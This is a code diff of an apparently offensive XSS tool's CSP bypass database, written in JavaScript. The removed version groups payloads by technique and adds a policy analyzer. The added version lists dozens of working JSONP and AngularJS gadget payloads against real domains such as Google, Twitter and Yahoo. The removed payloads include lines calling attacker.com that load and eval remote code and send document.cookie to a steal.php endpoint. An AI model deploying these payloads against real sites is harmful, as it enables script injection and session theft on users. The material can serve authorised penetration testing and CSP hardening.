@@ -1,683 +1,356 @@
-/* XSSNinja - Advanced CSP Bypass Database */
-/* Inspired by renniepak/CSPBypass, CSP evaluator, and latest research */
+/**
+ * CSP Bypass Database
+ */
 
-const cspBypassDatabase = {
-  // JSONP Gadgets - Most common CSP bypass method
-  jsonpGadgets: {
-    google: [
-      {
-        id: 1001,
-        domain: "www.google.com",
-        endpoint: "/complete/search",
-        payload: "<script src=\"https://www.google.com/complete/search?client=chrome&jsonp=alert(1);\"></script>",
-        description: "Google Search autocomplete JSONP callback",
-        parameters: "client=chrome&jsonp=CALLBACK",
-        csp_bypassed: "script-src 'self' *.google.com",
-        effectiveness: 89,
-        discovery_date: "2020-03-15",
-        status: "active",
-        browsers: ["Chrome", "Firefox", "Safari", "Edge"],
-        tags: ["jsonp", "google", "autocomplete"],
-        contributor: "CSP Research Team"
-      },
-      {
-        id: 1002,
-        domain: "accounts.google.com",
-        endpoint: "/o/oauth2/revoke",
-        payload: "<script src=\"https://accounts.google.com/o/oauth2/revoke?callback=alert(1);\"></script>",
-        description: "Google OAuth revocation JSONP endpoint",
-        parameters: "callback=CALLBACK",
-        csp_bypassed: "script-src 'self' *.google.com",
-        effectiveness: 85,
-        discovery_date: "2019-11-20",
-        status: "active",
-        browsers: ["Chrome", "Firefox", "Safari"],
-        tags: ["jsonp", "google", "oauth"],
-        contributor: "OAuth Research"
-      },
-      {
-        id: 1003,
-        domain: "www.google.com",
-        endpoint: "/tools/feedback/escalation-options",
-        payload: "<script src=\"https://www.google.com/tools/feedback/escalation-options?callback=alert(1);\"></script>",
-        description: "Google Feedback escalation JSONP",
-        parameters: "callback=CALLBACK",
-        csp_bypassed: "script-src 'self' *.google.com",
-        effectiveness: 82,
-        discovery_date: "2021-05-10",
-        status: "active",
-        browsers: ["Chrome", "Firefox"],
-        tags: ["jsonp", "google", "feedback"],
-        contributor: "Google Research"
-      },
-      {
-        id: 1004,
-        domain: "cse.google.com",
-        endpoint: "/api",
-        payload: "<script src=\"https://cse.google.com/api?callback=alert(1);\"></script>",
-        description: "Google Custom Search Engine JSONP",
-        parameters: "callback=CALLBACK",
-        csp_bypassed: "script-src 'self' *.google.com",
-        effectiveness: 78,
-        discovery_date: "2020-08-22",
-        status: "active",
-        browsers: ["Chrome", "Firefox", "Safari"],
-        tags: ["jsonp", "google", "cse"],
-        contributor: "CSE Research"
-      }
-    ],
-
-    twitter: [
-      {
-        id: 1005,
-        domain: "api.twitter.com",
-        endpoint: "/1/statuses/oembed.json",
-        payload: "<script src=\"https://api.twitter.com/1/statuses/oembed.json?callback=alert(1);\"></script>",
-        description: "Twitter oEmbed JSONP endpoint",
-        parameters: "callback=CALLBACK",
-        csp_bypassed: "script-src 'self' *.twitter.com",
-        effectiveness: 87,
-        discovery_date: "2019-09-12",
-        status: "active",
-        browsers: ["Chrome", "Firefox", "Safari"],
-        tags: ["jsonp", "twitter", "oembed"],
-        contributor: "Twitter Research"
-      },
-      {
-        id: 1006,
-        domain: "cdn.syndication.twimg.com",
-        endpoint: "/widgets/timelines",
-        payload: "<script src=\"https://cdn.syndication.twimg.com/widgets/timelines?callback=alert(1);\"></script>",
-        description: "Twitter timeline widget JSONP",
-        parameters: "callback=CALLBACK",
-        csp_bypassed: "script-src 'self' *.twimg.com",
-        effectiveness: 83,
-        discovery_date: "2020-12-05",
-        status: "active",
-        browsers: ["Chrome", "Firefox"],
-        tags: ["jsonp", "twitter", "timeline"],
-        contributor: "Widget Research"
-      }
-    ],
-
-    youtube: [
-      {
-        id: 1007,
-        domain: "www.youtube.com",
-        endpoint: "/oembed",
-        payload: "<script src=\"https://www.youtube.com/oembed?callback=alert(1);\"></script>",
-        description: "YouTube oEmbed JSONP endpoint",
-        parameters: "callback=CALLBACK",
-        csp_bypassed: "script-src 'self' *.youtube.com",
-        effectiveness: 85,
-        discovery_date: "2020-04-18",
-        status: "active",
-        browsers: ["Chrome", "Firefox", "Safari"],
-        tags: ["jsonp", "youtube", "oembed"],
-        contributor: "YouTube Research"
-      },
-      {
-        id: 1008,
-        domain: "suggestqueries.google.com",
-        endpoint: "/complete/search",
-        payload: "<script src=\"https://suggestqueries.google.com/complete/search?client=youtube&jsonp=alert(1);\"></script>",
-        description: "YouTube search suggestions JSONP",
-        parameters: "client=youtube&jsonp=CALLBACK",
-        csp_bypassed: "script-src 'self' *.google.com",
-        effectiveness: 81,
-        discovery_date: "2021-01-30",
-        status: "active",
-        browsers: ["Chrome", "Firefox"],
-        tags: ["jsonp", "youtube", "search"],
-        contributor: "Search Research"
-      }
-    ],
-
-    github: [
-      {
-        id: 1009,
-        domain: "api.github.com",
-        endpoint: "/repos",
-        payload: "<script src=\"https://api.github.com/repos/user/repo?callback=alert(1);\"></script>",
-        description: "GitHub API repository JSONP",
-        parameters: "callback=CALLBACK",
-        csp_bypassed: "script-src 'self' *.github.com",
-        effectiveness: 79,
-        discovery_date: "2020-07-14",
-        status: "deprecated",
-        browsers: ["Chrome", "Firefox"],
-        tags: ["jsonp", "github", "api"],
-        contributor: "GitHub Research"
-      }
-    ],
-
-    facebook: [
-      {
-        id: 1010,
-        domain: "connect.facebook.net",
-        endpoint: "/en_US/sdk.js",
-        payload: "<script src=\"https://connect.facebook.net/en_US/sdk.js#xfbml=1&appId=123&callback=alert(1);\"></script>",
-        description: "Facebook SDK JSONP callback",
-        parameters: "callback=CALLBACK",
-        csp_bypassed: "script-src 'self' *.facebook.net",
-        effectiveness: 74,
-        discovery_date: "2019-12-08",
-        status: "patched",
-        browsers: ["Chrome", "Firefox"],
-        tags: ["jsonp", "facebook", "sdk"],
-        contributor: "Facebook Research"
-      }
-    ],
-
-    vimeo: [
-      {
-        id: 1011,
-        domain: "vimeo.com",
-        endpoint: "/api/oembed.json",
-        payload: "<script src=\"https://vimeo.com/api/oembed.json?callback=alert(1);\"></script>",
-        description: "Vimeo oEmbed JSONP endpoint",
-        parameters: "callback=CALLBACK",
-        csp_bypassed: "script-src 'self' *.vimeo.com",
-        effectiveness: 76,
-        discovery_date: "2020-10-22",
-        status: "active",
-        browsers: ["Chrome", "Firefox", "Safari"],
-        tags: ["jsonp", "vimeo", "oembed"],
-        contributor: "Vimeo Research"
-      }
-    ],
-
-    flickr: [
-      {
-        id: 1012,
-        domain: "api.flickr.com",
-        endpoint: "/services/rest",
-        payload: "<script src=\"https://api.flickr.com/services/rest?format=json&jsoncallback=alert(1);\"></script>",
-        description: "Flickr API JSONP endpoint",
-        parameters: "format=json&jsoncallback=CALLBACK",
-        csp_bypassed: "script-src 'self' *.flickr.com",
-        effectiveness: 77,
-        discovery_date: "2020-06-03",
-        status: "active",
-        browsers: ["Chrome", "Firefox"],
-        tags: ["jsonp", "flickr", "api"],
-        contributor: "Flickr Research"
-      }
-    ]
-  },
-
-  // AngularJS Template Injection bypasses
-  angularjs: [
-    {
-      id: 2001,
-      payload: "{{constructor.constructor('alert(1)')()}}",
-      description: "AngularJS 1.x constructor bypass",
-      csp_bypassed: "script-src 'self'",
-      effectiveness: 92,
-      context: "AngularJS",
-      version: "1.0-1.5",
-      contributor: "Gareth Heyes",
-      browsers: ["Chrome", "Firefox", "Safari", "Edge"],
-      tags: ["angularjs", "constructor", "template"]
-    },
-    {
-      id: 2002,
-      payload: "{{a='constructor';b={};a.sub.call.call(b[a].getOwnPropertyDescriptor(b[a].getPrototypeOf(a.sub),a).value,0,'alert(1)')()}}",
-      description: "AngularJS 1.6+ sandbox bypass",
-      csp_bypassed: "script-src 'self'",
-      effectiveness: 88,
-      context: "AngularJS",
-      version: "1.6+",
-      contributor: "Jan Horn",
-      browsers: ["Chrome", "Firefox", "Safari"],
-      tags: ["angularjs", "sandbox", "bypass"]
-    },
-    {
-      id: 2003,
-      payload: "{{toString.constructor.prototype.toString=toString.constructor.prototype.call;['a'].map(toString.constructor.prototype.toString,'alert(1)')}}",
-      description: "AngularJS prototype pollution bypass",
-      csp_bypassed: "script-src 'self'",
-      effectiveness: 85,
-      context: "AngularJS",
-      version: "1.3-1.5",
-      contributor: "Mario Heiderich",
-      browsers: ["Chrome", "Firefox"],
-      tags: ["angularjs", "prototype", "pollution"]
-    },
-    {
-      id: 2004,
-      payload: "{{('a').constructor.prototype.charAt=[].join;$eval('x=alert(1)')}}",
-      description: "AngularJS charAt override bypass",
-      csp_bypassed: "script-src 'self'",
-      effectiveness: 83,
-      context: "AngularJS",
-      version: "1.2-1.4",
-      contributor: "Sebastian Lekies",
-      browsers: ["Chrome", "Firefox", "Safari"],
-      tags: ["angularjs", "charAt", "override"]
-    },
-    {
-      id: 2005,
-      payload: "{{$new.constructor('alert(1)')()}}",
-      description: "AngularJS $new constructor bypass",
-      csp_bypassed: "script-src 'self'",
-      effectiveness: 79,
-      context: "AngularJS",
-      version: "1.0-1.3",
-      contributor: "AngularJS Research",
-      browsers: ["Chrome", "Firefox"],
-      tags: ["angularjs", "$new", "constructor"]
-    }
-  ],
-
-  // Script gadgets for various libraries
-  scriptGadgets: [
-    {
-      id: 3001,
-      library: "jQuery",
-      payload: "<script src=\"https://code.jquery.com/jquery-3.6.0.min.js\"></script><script>$.globalEval('alert(1)');</script>",
-      description: "jQuery globalEval execution",
-      csp_bypassed: "script-src 'self' code.jquery.com",
-      effectiveness: 94,
-      version: "all",
-      contributor: "jQuery Research",
-      browsers: ["Chrome", "Firefox", "Safari", "Edge"],
-      tags: ["jquery", "globaleval", "execution"]
-    },
-    {
-      id: 3002,
-      library: "Lodash",
-      payload: "<script src=\"https://cdn.jsdelivr.net/npm/lodash@4.17.21/lodash.min.js\"></script><script>_.template('${alert(1)}')()</script>",
-      description: "Lodash template injection",
-      csp_bypassed: "script-src 'self' cdn.jsdelivr.net",
-      effectiveness: 91,
-      version: "4.x",
-      contributor: "Lodash Research",
-      browsers: ["Chrome", "Firefox", "Safari"],
-      tags: ["lodash", "template", "injection"]
-    },
-    {
-      id: 3003,
-      library: "Prototype.js",
-      payload: "<script src=\"https://cdnjs.cloudflare.com/ajax/libs/prototype/1.7.3/prototype.min.js\"></script><script>$('body').insert('<img src=x onerror=alert(1)>');</script>",
-      description: "Prototype.js DOM insertion",
-      csp_bypassed: "script-src 'self' cdnjs.cloudflare.com",
-      effectiveness: 87,
-      version: "1.7.x",
-      contributor: "Prototype Research",
-      browsers: ["Chrome", "Firefox"],
-      tags: ["prototype", "dom", "insertion"]
-    },
-    {
-      id: 3004,
-      library: "Dojo Toolkit",
-      payload: "<script src=\"https://ajax.googleapis.com/ajax/libs/dojo/1.16.0/dojo/dojo.js\"></script><script>dojo.eval('alert(1)');</script>",
-      description: "Dojo Toolkit eval execution",
-      csp_bypassed: "script-src 'self' ajax.googleapis.com",
-      effectiveness: 84,
-      version: "1.x",
-      contributor: "Dojo Research",
-      browsers: ["Chrome", "Firefox"],
-      tags: ["dojo", "eval", "execution"]
-    },
-    {
-      id: 3005,
-      library: "Mootools",
-      payload: "<script src=\"https://cdnjs.cloudflare.com/ajax/libs/mootools/1.6.0/mootools-core.min.js\"></script><script>Browser.exec('alert(1)');</script>",
-      description: "Mootools Browser.exec execution",
-      csp_bypassed: "script-src 'self' cdnjs.cloudflare.com",
-      effectiveness: 81,
-      version: "1.6.x",
-      contributor: "Mootools Research",
-      browsers: ["Chrome", "Firefox"],
-      tags: ["mootools", "browser", "exec"]
-    }
-  ],
-
-  // Data URI bypasses
-  dataUri: [
-    {
-      id: 4001,
-      payload: "<script src=\"data:application/javascript,alert(1)\"></script>",
-      description: "Data URI with JavaScript MIME type",
-      csp_bypassed: "script-src 'self'",
-      effectiveness: 76,
-      contributor: "Data URI Research",
-      browsers: ["Firefox", "Safari"],
-      tags: ["data", "uri", "javascript"],
-      note: "Blocked by Chrome"
-    },
-    {
-      id: 4002,
-      payload: "<script src=\"data:text/javascript,alert(1)\"></script>",
-      description: "Data URI with text/javascript MIME type",
-      csp_bypassed: "script-src 'self'",
-      effectiveness: 74,
-      contributor: "Data URI Research",
-      browsers: ["Firefox"],
-      tags: ["data", "uri", "text"],
-      note: "Legacy MIME type"
-    },
-    {
-      id: 4003,
-      payload: "<iframe src=\"data:text/html,<script>parent.alert(1)</script>\"></iframe>",
-      description: "Data URI iframe with HTML content",
-      csp_bypassed: "frame-src 'self'",
-      effectiveness: 82,
-      contributor: "Iframe Research",
-      browsers: ["Chrome", "Firefox", "Safari"],
-      tags: ["data", "uri", "iframe"]
-    },
-    {
-      id: 4004,
-      payload: "<object data=\"data:text/html,<script>alert(1)</script>\"></object>",
-      description: "Data URI object with HTML content",
-      csp_bypassed: "object-src 'self'",
-      effectiveness: 78,
-      contributor: "Object Research",
-      browsers: ["Firefox", "Safari"],
-      tags: ["data", "uri", "object"]
-    }
-  ],
-
-  // Object/Embed bypasses
-  objectEmbed: [
-    {
-      id: 5001,
-      payload: "<object data=\"https://example.com/xss.swf\"></object>",
-      description: "Flash object bypass",
-      csp_bypassed: "object-src 'self' example.com",
-      effectiveness: 65,
-      contributor: "Flash Research",
-      browsers: ["Legacy"],
-      tags: ["object", "flash", "swf"],
-      note: "Flash deprecated in modern browsers"
-    },
-    {
-      id: 5002,
-      payload: "<embed src=\"https://example.com/exploit.pdf#javascript:alert(1)\"></embed>",
-      description: "PDF embed with JavaScript URL",
-      csp_bypassed: "object-src 'self' example.com",
-      effectiveness: 58,
-      contributor: "PDF Research",
-      browsers: ["Legacy"],
-      tags: ["embed", "pdf", "javascript"],
-      note: "Blocked in modern browsers"
-    },
-    {
-      id: 5003,
-      payload: "<object data=\"//evil.com/exploit.html\"></object>",
-      description: "Object with protocol-relative URL",
-      csp_bypassed: "object-src 'self'",
-      effectiveness: 71,
-      contributor: "Protocol Research",
-      browsers: ["Chrome", "Firefox"],
-      tags: ["object", "protocol", "relative"]
-    }
-  ],
-
-  // WebSocket bypasses
-  websocket: [
-    {
-      id: 6001,
-      payload: "<script>new WebSocket('wss://attacker.com').onmessage=function(e){eval(e.data)};</script>",
-      description: "WebSocket with eval payload execution",
-      csp_bypassed: "connect-src 'self'",
-      effectiveness: 89,
-      contributor: "WebSocket Research",
-      browsers: ["Chrome", "Firefox", "Safari", "Edge"],
-      tags: ["websocket", "eval", "execution"]
-    },
-    {
-      id: 6002,
-      payload: "<script>fetch('wss://attacker.com').then(r=>r.text()).then(eval);</script>",
-      description: "Fetch API with WebSocket URL",
-      csp_bypassed: "connect-src 'self'",
-      effectiveness: 73,
-      contributor: "Fetch Research",
-      browsers: ["Chrome", "Firefox"],
-      tags: ["fetch", "websocket", "eval"]
-    }
-  ],
-
-  // Base URI bypasses
-  baseUri: [
-    {
-      id: 7001,
-      payload: "<base href=\"//attacker.com/\"><script src=\"/evil.js\"></script>",
-      description: "Base tag hijacking for script source",
-      csp_bypassed: "base-uri not set",
-      effectiveness: 95,
-      contributor: "Base Research",
-      browsers: ["Chrome", "Firefox", "Safari", "Edge"],
-      tags: ["base", "hijacking", "script"]
-    },
-    {
-      id: 7002,
-      payload: "<base href=\"javascript:alert(1)//\"><a href=\"#\">Click</a>",
-      description: "Base tag with JavaScript URL",
-      csp_bypassed: "base-uri not set",
-      effectiveness: 67,
-      contributor: "JavaScript Research",
-      browsers: ["Legacy"],
-      tags: ["base", "javascript", "url"]
-    }
-  ],
-
-  // Form action bypasses
-  formAction: [
-    {
-      id: 8001,
-      payload: "<form action=\"javascript:alert(1)\"><input type=\"submit\" value=\"Click\"></form>",
-      description: "Form action with JavaScript URL",
-      csp_bypassed: "form-action not set",
-      effectiveness: 78,
-      contributor: "Form Research",
-      browsers: ["Chrome", "Firefox"],
-      tags: ["form", "action", "javascript"]
-    },
-    {
-      id: 8002,
-      payload: "<button formaction=\"javascript:alert(1)\">Click</button>",
-      description: "Button formaction with JavaScript URL",
-      csp_bypassed: "form-action not set",
-      effectiveness: 75,
-      contributor: "Button Research",
-      browsers: ["Chrome", "Firefox", "Safari"],
-      tags: ["button", "formaction", "javascript"]
-    }
-  ],
-
-  // Worker bypasses
-  worker: [
-    {
-      id: 9001,
-      payload: "<script>new Worker('data:application/javascript,importScripts(\"//attacker.com/evil.js\")');</script>",
-      description: "Web Worker with data URI and importScripts",
-      csp_bypassed: "worker-src 'self'",
-      effectiveness: 84,
-      contributor: "Worker Research",
-      browsers: ["Chrome", "Firefox"],
-      tags: ["worker", "data", "importscripts"]
-    },
-    {
-      id: 9002,
-      payload: "<script>new SharedWorker('//attacker.com/evil.js');</script>",
-      description: "SharedWorker with external source",
-      csp_bypassed: "worker-src 'self'",
-      effectiveness: 81,
-      contributor: "SharedWorker Research",
-      browsers: ["Chrome", "Firefox"],
-      tags: ["sharedworker", "external", "source"]
-    }
-  ],
-
-  // Manifest bypasses
-  manifest: [
-    {
-      id: 10001,
-      payload: "<link rel=\"manifest\" href=\"//attacker.com/manifest.json\">",
-      description: "Web App Manifest from external source",
-      csp_bypassed: "manifest-src not set",
-      effectiveness: 72,
-      contributor: "Manifest Research",
-      browsers: ["Chrome", "Edge"],
-      tags: ["manifest", "external", "webapp"]
-    }
-  ],
-
-  // Font bypasses
-  font: [
-    {
-      id: 11001,
-      payload: "<style>@font-face{font-family:x;src:url('//attacker.com/font.woff')}</style>",
-      description: "Font loading from external source",
-      csp_bypassed: "font-src not set",
-      effectiveness: 68,
-      contributor: "Font Research",
-      browsers: ["Chrome", "Firefox", "Safari"],
-      tags: ["font", "external", "fontface"]
-    }
-  ],
-
-  // CSS injection bypasses
-  cssInjection: [
-    {
-      id: 12001,
-      payload: "<style>body{background:url('javascript:alert(1)')}</style>",
-      description: "CSS background with JavaScript URL",
-      csp_bypassed: "style-src 'unsafe-inline'",
-      effectiveness: 43,
-      contributor: "CSS Research",
-      browsers: ["Legacy"],
-      tags: ["css", "background", "javascript"]
-    },
-    {
-      id: 12002,
-      payload: "<style>@import 'data:text/css,body{background:url(javascript:alert(1))}';</style>",
-      description: "CSS import with data URI containing JavaScript",
-      csp_bypassed: "style-src 'unsafe-inline'",
-      effectiveness: 38,
-      contributor: "Import Research",
-      browsers: ["Legacy"],
-      tags: ["css", "import", "data"]
-    },
-    {
-      id: 12003,
-      payload: "<div style=\"background:url('//attacker.com/steal.php?data='+document.cookie)\"></div>",
-      description: "CSS background for data exfiltration",
-      csp_bypassed: "style-src 'unsafe-inline', img-src attacker.com",
-      effectiveness: 91,
-      contributor: "Exfiltration Research",
-      browsers: ["Chrome", "Firefox", "Safari", "Edge"],
-      tags: ["css", "exfiltration", "background"]
-    }
-  ]
-};
-
-// CSP Policy Analyzer - helps identify bypassable configurations
-const CSPAnalyzer = {
-  analyzePolicy: function(cspHeader) {
-    const vulnerabilities = [];
-    const policy = this.parseCSP(cspHeader);
-
-    // Check for missing directives
-    if (!policy['base-uri']) {
-      vulnerabilities.push({
-        type: 'missing_directive',
-        directive: 'base-uri',
-        severity: 'high',
-        description: 'Missing base-uri directive allows base tag injection',
-        bypass_methods: ['baseUri']
-      });
-    }
-
-    if (!policy['object-src']) {
-      vulnerabilities.push({
-        type: 'missing_directive',
-        directive: 'object-src',
-        severity: 'medium',
-        description: 'Missing object-src directive allows object/embed injection',
-        bypass_methods: ['objectEmbed']
-      });
-    }
-
-    // Check for unsafe configurations
-    if (policy['script-src'] && policy['script-src'].includes("'unsafe-eval'")) {
-      vulnerabilities.push({
-        type: 'unsafe_directive',
-        directive: 'script-src',
-        severity: 'critical',
-        description: "unsafe-eval allows JavaScript eval() execution",
-        bypass_methods: ['angularjs', 'scriptGadgets']
-      });
-    }
-
-    if (policy['script-src'] && policy['script-src'].includes("'unsafe-inline'")) {
-      vulnerabilities.push({
-        type: 'unsafe_directive',
-        directive: 'script-src',
-        severity: 'critical',
-        description: "unsafe-inline allows inline JavaScript execution",
-        bypass_methods: ['all']
-      });
-    }
-
-    // Check for wildcard domains
-    if (policy['script-src'] && policy['script-src'].includes('*')) {
-      vulnerabilities.push({
-        type: 'wildcard_domain',
-        directive: 'script-src',
-        severity: 'high',
-        description: 'Wildcard domains in script-src allow JSONP bypasses',
-        bypass_methods: ['jsonpGadgets']
-      });
-    }
-
-    return {
-      policy: policy,
-      vulnerabilities: vulnerabilities,
-      bypassable: vulnerabilities.length > 0
-    };
-  },
-
-  parseCSP: function(cspHeader) {
-    const directives = {};
-    const parts = cspHeader.split(';');
-
-    parts.forEach(part => {
-      const trimmed = part.trim();
-      if (trimmed) {
-        const [directive, ...values] = trimmed.split(/\s+/);
-        directives[directive] = values;
-      }
-    });
-
-    return directives;
-  },
-
-  suggestFixes: function(vulnerabilities) {
-    const fixes = [];
-
-    vulnerabilities.forEach(vuln => {
-      switch(vuln.type) {
-        case 'missing_directive':
-          fixes.push(`Add ${vuln.directive} 'self' to prevent ${vuln.description.toLowerCase()}`);
-          break;
-        case 'unsafe_directive':
-          fixes.push(`Remove 'unsafe-${vuln.directive.includes('eval') ? 'eval' : 'inline'}' from ${vuln.directive}`);
-          break;
-        case 'wildcard_domain':
-          fixes.push(`Replace wildcards in ${vuln.directive} with specific trusted domains`);
-          break;
-      }
-    });
-
-    return fixes;
-  }
-};
+const CSP_BYPASS_DATABASE = [
+    { domain: "cdn.jsdelivr.net", code: `<script src="https://cdn.jsdelivr.net/npm/angular@1.8.3/angular.min.js"></script><div ng-app><img src=x ng-on-error="window=\$event.target.ownerDocument.defaultView;window.alert(window.origin);">` },
+    { domain: "api.mixpanel.com", code: `<script src="https://api.mixpanel.com/track/?callback=alert(1337)"></script>` },
+    { domain: "www.google.com", code: `<script src="https://www.google.com/complete/search?client=chrome&jsonp=alert(1)"></script>` },
+    { domain: "translate.yandex.net", code: `<script src="https://translate.yandex.net/api/v1.5/tr.json/detect?callback=alert"></script>` },
+    { domain: "accounts.google.com", code: `<script src="https://accounts.google.com/o/oauth2/revoke?callback=alert(1337)"></script>` },
+    { domain: "api.twitter.com", code: `<script src="https://api.twitter.com/1/statuses/oembed.json?url=https://x.com/jack/status/20&callback=alert"></script>` },
+    { domain: "cdnjs.cloudflare.com", code: `<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.8.3/angular.js"></script><div ng-app><img src=x ng-on-error="window=\$event.target.ownerDocument.defaultView;window.alert(window.origin);">` },
+    { domain: "googleads.g.doubleclick.net", code: `<script src="https://googleads.g.doubleclick.net/pagead/conversion/1036918760/wcm?callback=alert(1337)"></script>` },
+    { domain: "www.blogger.com", code: `<script src="https://www.blogger.com/feeds/8063678697117239807/posts/default?callback=alert"></script>` },
+    { domain: "api.github.com", code: `<script src="https://api.github.com/search/code?callback=alert"></script>` },
+    { domain: "suggest.taobao.com", code: `<script src="https://suggest.taobao.com/sug?callback=alert"></script>` },
+    { domain: "mkto.uber.com", code: `<script src="https://mkto.uber.com/index.php/form/getKnownLead?callback=alert(document.domain);"></script>` },
+    { domain: "ajax.googleapis.com", code: `<script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.8.3/angular.js"></script><div ng-app><img src=x ng-on-error="window=\$event.target.ownerDocument.defaultView;window.alert(window.origin);">` },
+    { domain: "www.youtube.com", code: `<script src="https://www.youtube.com/oembed?callback=alert(1)"></script>` },
+    { domain: "api.vk.com", code: `<script src="https://api.vk.com/method/wall.get?callback=alert(1337)"></script>` },
+    { domain: "cse.google.com", code: `<script src="https://cse.google.com/api/007627024705277327428/cse/r3vs7b0fcli/queries/js?callback=alert(1337)"></script>` },
+    { domain: "maps.googleapis.com", code: `<script src="https://maps.googleapis.com/maps/api/js?callback=alert(1337)"></script>` },
+    { domain: "unpkg.com", code: `<script src="https://unpkg.com/angular@1.8.3/angular.min.js"></script><div ng-app><img src=x ng-on-error="window=\$event.target.ownerDocument.defaultView;window.alert(window.origin);">` },
+    { domain: "twitter.com", code: `<script src="https://twitter.com/statuses/user_timeline/yakumo119info.json?callback=confirm()"></script>` },
+    { domain: "api-metrika.yandex.ru", code: `<script src="https://api-metrika.yandex.ru/management/v1/counter/1/operation/1?callback=alert"></script>` },
+    { domain: "www.googleadservices.com", code: `<script src="https://www.googleadservices.com/pagead/conversion/1070110417/wcm?callback=alert(1337)"></script>` },
+    { domain: "graph.facebook.com", code: `<script src="https://graph.facebook.com/?id=1337&callback=alert"></script>` },
+    { domain: "mango.buzzfeed.com", code: `<script src="https://mango.buzzfeed.com/polls/service/editorial/post?poll_id=121996521&result_id=1&callback=alert(1)%2f%2f"></script>` },
+    { domain: "www.reddit.com", code: `<script src="https://www.reddit.com/.json?jsonp=alert"></script>` },
+    { domain: "detector.alicdn.com", code: `<script src="https://detector.alicdn.com/2.7.3/index.php?callback=alert(1337)"></script>` },
+    { domain: "search.twitter.com", code: `<script src="http://search.twitter.com/trends.json?callback=alert()"></script>` },
+    { domain: "7b936.v.fwmrm.net", code: `<script src="https://7b936.v.fwmrm.net/ad/g/1?nw=1&csid=1&resp=json&cbfn=alert(1)-"></script>` },
+    { domain: "mempf.yahoo.co.jp", code: `<script src="https://mempf.yahoo.co.jp/offer?position=h&callback=alert(1337)//"></script>` },
+    { domain: "apis.google.com", code: `<script src="https://apis.google.com/complete/search?client=chrome&q=x&callback=alert"></script>` },
+    { domain: "www.sharethis.com", code: `<script src="https://www.sharethis.com/get-publisher-info.php?callback=alert(1337)"></script>` },
+    { domain: "a.config.skype.com", code: `<script src="https://a.config.skype.com/config/v1/SkypeLyncWebExperience/905_1.2.5.0?apikey=shareButton&fingerprint=0487c2fb-967c-4d8d-9635-75249326f72e&callback=alert"></script>` },
+    { domain: "bebezoo.1688.com", code: `<script src="https://bebezoo.1688.com/fragment/index.htm?callback=alert(1337)"></script>` },
+    { domain: "a.huodong.mi.com", code: `<script src="https://a.huodong.mi.com/postfree/postfree?callback=alert"></script>` },
+    { domain: "m.addthis.com", code: `<script src="https://m.addthis.com/live/red_lojson/100eng.json?callback=alert(1337)"></script>` },
+    { domain: "a.sm.cn", code: `<script src="http://a.sm.cn/api/getgamehotboarddata?format=jsonp&page=1&_=1537365429621&callback=confirm(1);jsonp1"></script>` },
+    { domain: "www.aol.com", code: `<script src="https://www.aol.com/amp-proxy/api/finance-instruments/14.1.MSTATS_NYSE_L/?callback=confirm(9)//jQuery1120033838593671435757_1537274810388&_=1537274810389"></script>` },
+    { domain: "aax-us-east-retail-direct.amazon.com", code: `<script src="https://aax-us-east-retail-direct.amazon.com/e/xsp/getAdj?callback=alert(1)-"></script>` },
+    { domain: "count.tbcdn.cn", code: `<script src="https://count.tbcdn.cn//counter3?callback=alert(1337)"></script>` },
+    { domain: "abr.business.gov.au", code: `<script src="https://abr.business.gov.au/json/AcnDetails.aspx?callback=prompt(1)//"></script>` },
+    { domain: "passport.ngs.ru", code: `<script src="https://passport.ngs.ru/ajax/check?callback=alert(1337)"></script>` },
+    { domain: "abtasty.com", code: `<script src="https://abtasty.com/wp-json?_jsonp=alert"></script>` },
+    { domain: "suggest-shop.yahooapis.jp", code: `<script src="https://suggest-shop.yahooapis.jp/Shopping/Suggest/V1/suggester?callback=alert(1337)//&appid=dj0zaiZpPVkwMDJ1RHlqOEdwdCZzPWNvbnN1bWVyc2VjcmV0Jng9M2Y-"></script>` },
+    { domain: "accdn.lpsnmedia.net", code: `<script src="https://accdn.lpsnmedia.net/api/account/1/configuration/engagement-window/window-confs/1?cb=alert"></script>` },
+    { domain: "api.userlike.com", code: `<script src="https://api.userlike.com/api/chat/slot/proactive/?callback=alert(1337)"></script>` },
+    { domain: "acs.aliexpress.com", code: `<script src="https://acs.aliexpress.com/h5/mtop.aliexpress.address.shipto.division.get/1.0/?type=jsonp&dataType=jsonp&callback=alert"></script>` },
+    { domain: "www.youku.com", code: `<script src="https://www.youku.com/index_cookielist/s/jsonp?callback=alert(1337)"></script>` },
+    { domain: "acs.youku.com", code: `<script src="https://acs.youku.com/h5/mtop.youku.playlog.open.get/1.0/?jsv=2.6.1&appKey=24679788&t=1734359327631&sign=6b8f8b6abb27c68582606eed336c887d&api=mtop.youku.playlog.open.get&v=1.0&dataType=jsonp&jsonpIncPrefix=headerRecord1734359327618&type=jsonp&callback=alert&data={%22nlid%22%3A%22XlQcF5xQrCcCAWoLKdGqIOhS%22%2C%22uid%22%3A%22%22%2C%22pageLength%22%3A100%2C%22timestamp%22%3A%221734359327617%22%2C%22appKey%22%3A%22qPbb2hfIYugHjMaj%22%2C%22appName%22%3A%22pc%22%2C%22hwClass%22%3A1%2C%22deviceName%22%3A%22web%22%2C%22isPlayController%22%3A1%2C%22ccode%22%3A%220502%22%2C%22clientDrmAbility%22%3A3}"></script>` },
+    { domain: "www.travelpayouts.com", code: `<script src="https://www.travelpayouts.com/widgets/50f53ce9ada1b54bcc000031.json?callback=alert(1337)"></script>` },
+    { domain: "adhouse.pro", code: `<script src="https://adhouse.pro/wp-json?_jsonp=alert"></script>` },
+    { domain: "ads.yap.yahoo.com", code: `<script src="https://ads.yap.yahoo.com/nosdk/wj/v1/getAds.do?locale=en_us&agentVersion=205&adTrackingEnabled=true&adUnitCode=2e268534-d01b-4616-83cd-709bd90690e1&apiKey=P3VYQ352GKX74CFTRH7X&gdpr=false&euconsent=&publisherUrl=https%3A%2F%2Fwww.autoblog.com&cb=alert();"></script>` },
+    { domain: "admatic.com.tr", code: `<script src="https://admatic.com.tr/wp-json?_jsonp=alert"></script>` },
+    { domain: "df-webservices.comet.aol.com", code: `<script src="https://df-webservices.comet.aol.com/sigfig/ws?service=sigfig_portfolios&porttype=2&portmax=5&rf=http://www.dailyfinance.com&callback=jsonCallback24098%3balert(1)%2f%2f476&_=1537149044679"></script>` },
+    { domain: "admixer.com", code: `<script src="https://admixer.com/wp-json?_jsonp=alert"></script>` },
+    { domain: "api.cmi.aol.com", code: `<script src="https://api.cmi.aol.com/content/alert/homepage-alert?site=usaol&callback=confirm(1);//jQuery20108887725116629929_1528071050373472232&_=1528071050374"></script>` },
